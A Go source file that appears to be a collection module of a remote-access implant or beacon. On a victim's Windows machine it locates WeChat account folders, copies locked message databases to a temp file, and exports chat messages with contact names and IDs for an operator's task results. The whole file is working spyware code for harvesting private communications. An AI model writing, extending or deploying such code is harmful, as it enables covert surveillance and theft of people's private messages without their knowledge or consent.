//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

const (
	wechatHistoryMaxDBBytes = 64 << 20 // 64 MB
	wechatHistoryMaxRows    = 200
)

type wechatFilter struct {
	Filter    string `json:"filter"`
	Contact   string `json:"contact"`
	StartTime string `json:"start_time"`
	EndTime   string `json:"end_time"`
}

type wechatMessage struct {
	Time      string `json:"time"`
	Sender    string `json:"sender"`     // "me" or "other"
	Contact   string `json:"contact"`    // contact name/remark
	ContactID string `json:"contact_id"` // wxid
	Type      int    `json:"type"`       // message type
	Content   string `json:"content"`    // message content (may be encrypted)
}

func handleWeChatHistory(task Task, res *TaskResult) {
	var f wechatFilter
	if task.Command != "" {
		_ = json.Unmarshal([]byte(task.Command), &f)
	}
	if f.Filter == "" {
		f.Filter = "all"
	}
	out := exportWeChatHistory(f)
	res.Output = out
}

func wechatDataRoots() ([]string, []string) {
	if runtime.GOOS != "windows" {
		return nil, nil
	}
	// Account containers to probe, oldest layout first:
	//  - legacy (WeChat <= 3.x): %APPDATA%\Tencent\WeChat\<wxid>\Msg
	//  - modern (WeChat >= 3.9 / 4.x default): %USERPROFILE%\Documents\WeChat Files\<wxid>\Msg
	var containers []string
	if appdata := os.Getenv("APPDATA"); appdata != "" {
		containers = append(containers, filepath.Join(appdata, "Tencent", "WeChat"))
	}
	if home := os.Getenv("USERPROFILE"); home != "" {
		containers = append(containers, filepath.Join(home, "Documents", "WeChat Files"))
	}
	return wechatMsgRoots(containers), containers
}

// wechatMsgRoots expands account containers into per-account Msg directories.
// Pure (no env/OS reads) so it is unit-testable on any platform.
func wechatMsgRoots(containers []string) []string {
	var roots []string
	seen := make(map[string]struct{})
	for _, container := range containers {
		entries, err := os.ReadDir(container)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			msgDir := filepath.Join(container, e.Name(), "Msg")
			if _, err := os.Stat(msgDir); err != nil {
				continue
			}
			if _, dup := seen[msgDir]; dup {
				continue
			}
			seen[msgDir] = struct{}{}
			roots = append(roots, msgDir)
		}
	}
	return roots
}

func exportWeChatHistory(f wechatFilter) string {
	f.Filter = strings.ToLower(strings.TrimSpace(f.Filter))
	if f.Filter == "" {
		f.Filter = "all"
	}
	f.Contact = strings.ToLower(strings.TrimSpace(f.Contact))

	startTime, endTime := parseWeChatRange(f)

	var sb strings.Builder
	sb.WriteString("=== wechat history ===\n")

	roots, probed := wechatDataRoots()
	if len(roots) == 0 {
		sb.WriteString("(WeChat data directory not found or not on Windows)\n")
		// Diagnostic for the operator: which account containers were checked.
		// `#` lines are ignored by the frontend parser. A custom FileStorage
		// location (WeChat Settings -> File Management) is not discoverable
		// here — check it manually when this lists only default paths.
		if len(probed) > 0 {
			fmt.Fprintf(&sb, "# probed: %s\n", strings.Join(probed, "; "))
		}
		return sb.String()
	}

	totalRows := 0
	// Contact names are shared across all db files (the same wxid shows up in
	// sharded message dbs), so index once and reuse.
	contactIndex := make(map[string]string)

	for _, msgRoot := range roots {
		// Global cap, not per-file: without this the 200-row limit is applied
		// to every db and a multi-db WeChat user gets 200 rows *per db*.
		remaining := wechatHistoryMaxRows - totalRows
		if remaining <= 0 {
			break
		}
		entries, err := os.ReadDir(msgRoot)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !strings.HasSuffix(e.Name(), ".db") {
				continue
			}
			dbPath := filepath.Join(msgRoot, e.Name())
			rows, err := queryWeChatDB(dbPath, f, startTime, endTime, remaining, contactIndex)
			if err != nil {
				fmt.Fprintf(&sb, "=== %s ===\nquery error: %v\n", e.Name(), err)
				continue
			}
			for _, r := range rows {
				totalRows++
				// Output as JSON line for easy parsing
				line, _ := json.Marshal(r)
				sb.WriteString(string(line))
				sb.WriteString("\n")
			}
			remaining = wechatHistoryMaxRows - totalRows
			if remaining <= 0 {
				break
			}
		}
	}

	if totalRows == 0 {
		sb.WriteString("(no matching messages found)\n")
	}
	fmt.Fprintf(&sb, "# total_rows=%d\n", totalRows)
	return sb.String()
}

func copyLockedDBSrc(src string) (string, error) {
	fi, err := os.Stat(src)
	if err != nil {
		return "", err
	}
	if fi.Size() > wechatHistoryMaxDBBytes {
		return "", fmt.Errorf("history db too large (%d bytes, cap %d)", fi.Size(), wechatHistoryMaxDBBytes)
	}
	dst := filepath.Join(os.TempDir(), fmt.Sprintf("wechat_hist_%d.db", time.Now().UnixNano()))
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return "", err
	}
	_, copyErr := io.Copy(out, io.LimitReader(in, wechatHistoryMaxDBBytes+1))
	closeErr := out.Close()
	if copyErr != nil {
		os.Remove(dst)
		return "", copyErr
	}
	if closeErr != nil {
		os.Remove(dst)
		return "", closeErr
	}
	return dst, nil
}

func queryWeChatDB(dbPath string, f wechatFilter, startTime, endTime time.Time, limit int, contactIndex map[string]string) ([]wechatMessage, error) {
	db, cleanup, err := openWeChatDB(dbPath)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	// Not every db carries a `contact` table — in newer WeChat layouts the
	// names live in a separate db file. Index this one when it has them, and
	// keep the shared index so nameless dbs can still be labeled later.
	hasContact := hasWeChatTable(db, "contact")
	if hasContact {
		_ = loadContacts(db, contactIndex)
	}

	// A contact-only db has nothing to read, but its names are already in the
	// shared index — skip silently rather than emitting a scary query error.
	if !hasWeChatTable(db, "message") {
		return nil, nil
	}

	// WeChat message table schema (typical):
	// message: MsgId, CreateTime, TalkerId, Type, Content, IsSender, MsgSource
	// contact: UserName, Alias, Remark, NickName, Type
	where := ` WHERE m.CreateTime >= ? AND m.CreateTime <= ?`
	args := []interface{}{unixMilli(startTime), unixMilli(endTime)}

	if f.Contact != "" && f.Contact != "all" {
		if hasContact {
			where += ` AND (LOWER(IFNULL(c.NickName,'')) LIKE ? ESCAPE '\' OR LOWER(IFNULL(c.Alias,'')) LIKE ? ESCAPE '\' OR LOWER(IFNULL(c.Remark,'')) LIKE ? ESCAPE '\' OR LOWER(m.TalkerId) LIKE ? ESCAPE '\')`
			args = append(args, likeArg(f.Contact), likeArg(f.Contact), likeArg(f.Contact), likeArg(f.Contact))
		} else {
			where += ` AND LOWER(m.TalkerId) LIKE ? ESCAPE '\'`
			args = append(args, likeArg(f.Contact))
		}
	}

	var query string
	if hasContact {
		query = "SELECT m.MsgId, m.CreateTime, m.TalkerId, m.Type, m.Content, m.IsSender, " +
			"IFNULL(c.NickName,''), IFNULL(c.Alias,''), IFNULL(c.Remark,'') " +
			"FROM message m LEFT JOIN contact c ON m.TalkerId = c.UserName" + where
	} else {
		query = "SELECT m.MsgId, m.CreateTime, m.TalkerId, m.Type, m.Content, m.IsSender, '', '', '' " +
			"FROM message m" + where
	}
	query += ` ORDER BY m.CreateTime DESC LIMIT ?`
	args = append(args, limit)

	rows, err := db.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var results []wechatMessage
	for rows.Next() {
		var msg wechatMessage
		var msgID, createTime int64
		var talkerID string
		var nickName, alias, remark string
		var isSender int
		if err := rows.Scan(&msgID, &createTime, &talkerID, &msg.Type, &msg.Content, &isSender, &nickName, &alias, &remark); err != nil {
			continue
		}
		msg.ContactID = talkerID
		msg.Time = time.UnixMilli(createTime).UTC().Format(time.RFC3339)
		// Sender: IsSender==1 means "me". Previously this was dropped, which
		// left the frontend's me/other filter and chat alignment broken.
		msg.Sender = "other"
		if isSender == 1 {
			msg.Sender = "me"
		}
		// Contact display: global index > per-row JOIN names > raw wxid, with
		// Remark > Alias > NickName precedence (matches the C beacon).
		msg.Contact = contactIndex[talkerID]
		if msg.Contact == "" {
			switch {
			case remark != "":
				msg.Contact = remark
			case alias != "":
				msg.Contact = alias
			case nickName != "":
				msg.Contact = nickName
			default:
				msg.Contact = talkerID
			}
		}
		results = append(results, msg)
	}
	return results, rows.Err()
}

// openWeChatDB opens a WeChat SQLite db, preferring a read-only open of the
// live file (no 64MB temp copy) and falling back to a temp copy when WeChat
// holds the db open/locked. The returned cleanup must be deferred; it closes
// the db and removes the temp copy (when one was made).
func openWeChatDB(path string) (*sql.DB, func(), error) {
	if ro := openWeChatDBReadonly(path); ro != nil {
		return ro, func() { ro.Close() }, nil
	}
	tmp, err := copyLockedDBSrc(path)
	if err != nil {
		return nil, func() {}, err
	}
	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		os.Remove(tmp)
		return nil, func() {}, err
	}
	return db, func() {
		db.Close()
		os.Remove(tmp)
	}, nil
}

// openWeChatDBReadonly attempts a read-only open of the live db file. It
// returns nil (never an error) when the file cannot be opened read-only so
// callers fall back to a copy. immutable=1 lets SQLite open it read-only
// without a journal/lock; if the driver rejects the DSN we just return nil.
func openWeChatDBReadonly(path string) *sql.DB {
	abs, err := filepath.Abs(path)
	if err != nil {
		return nil
	}
	db, err := sql.Open("sqlite", "file:"+abs+"?mode=ro&immutable=1")
	if err != nil {
		return nil
	}
	if err := db.Ping(); err != nil {
		db.Close()
		return nil
	}
	return db
}

// hasWeChatTable reports whether a table named name exists in the db.
func hasWeChatTable(db *sql.DB, name string) bool {
	var n int
	err := db.QueryRow("SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name=?", name).Scan(&n)
	return err == nil && n > 0
}

// likeArg wraps s in wildcards and escapes any LIKE metacharacters it
// contains (mirroring the C beacon), so a Contact filter like "50%" or "a_b"
// cannot widen the match beyond its intent. Pairs with the ESCAPE '\'
// clauses in the query.
func likeArg(s string) string {
	r := strings.NewReplacer(`\`, `\\`, `%`, `\%`, `_`, `\_`)
	return "%" + r.Replace(s) + "%"
}

// loadContacts indexes a db's `contact` table into idx (wxid -> friendly
// name, Remark > Alias > NickName). A db without a contact table is a no-op,
// not an error.
func loadContacts(db *sql.DB, idx map[string]string) error {
	rows, err := db.Query("SELECT UserName, IFNULL(NickName,''), IFNULL(Alias,''), IFNULL(Remark,'') FROM contact")
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var uname, nick, alias, remark string
		if rows.Scan(&uname, &nick, &alias, &remark) != nil {
			continue
		}
		if uname == "" {
			continue
		}
		label := remark
		if label == "" {
			label = alias
		}
		if label == "" {
			label = nick
		}
		if label != "" {
			idx[uname] = label
		}
	}
	return rows.Err()
}

func parseWeChatRange(f wechatFilter) (time.Time, time.Time) {
	var startTime, endTime time.Time
	if f.StartTime != "" {
		if t, err := time.Parse(time.RFC3339, f.StartTime); err == nil {
			startTime = t
		}
	}
	// An empty end time means "up to now". Without this default, the SQL
	// upper bound would be zero and legitimate history would be filtered out.
	if f.EndTime != "" {
		if t, err := time.Parse(time.RFC3339, f.EndTime); err == nil {
			endTime = t
		}
	}
	if endTime.IsZero() {
		endTime = time.Now().UTC()
	}
	return startTime, endTime
}

func unixMilli(t time.Time) int64 {
	if t.IsZero() {
		return 0
	}
	return t.UnixMilli()
}
